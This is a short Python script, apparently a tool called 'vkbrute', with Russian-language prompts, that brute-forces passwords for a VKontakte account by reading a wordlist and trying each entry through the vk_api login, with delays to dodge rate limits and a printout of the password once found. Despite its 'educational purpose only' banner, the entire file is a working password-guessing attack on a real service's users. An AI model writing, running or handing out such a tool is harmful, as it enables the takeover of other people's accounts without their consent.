import vk_api
import time

def banner():
    banner = """
       __    __            __     
 _  __/ /__ / /  ______ __/ /____ 
| |/ /  '_// _ \/ __/ // / __/ -_)
|___/_/\_\/_.__/_/  \_,_/\__/\__/ 
                                  
"""
    print(banner)
    print('Warning!')
    print('This tool is educational purpose only!')

def main():
    login = input('Номер> ')
    wordlist = input('Полный путь к файлу который я скинулt> ')
    timeout = input('Время лучше ставить 30-60, но можешь попробовать меньше> ')
    passwrd = open(wordlist, 'r')
    for i in passwrd:
        try:
            i = i[:-1]
            print(i)
            session = vk_api.VkApi(login, i)
            session.auth()
            session.get_api()
            print('Отлично! Вот пароль: ', i)
            exit()
        except vk_api.AuthError as error:
            print(error)
            if(str(error) == 'No handler for two-factor authentication'): print('Quitting!'); exit()
        time.sleep(int(timeout))
        time.sleep(15)
main()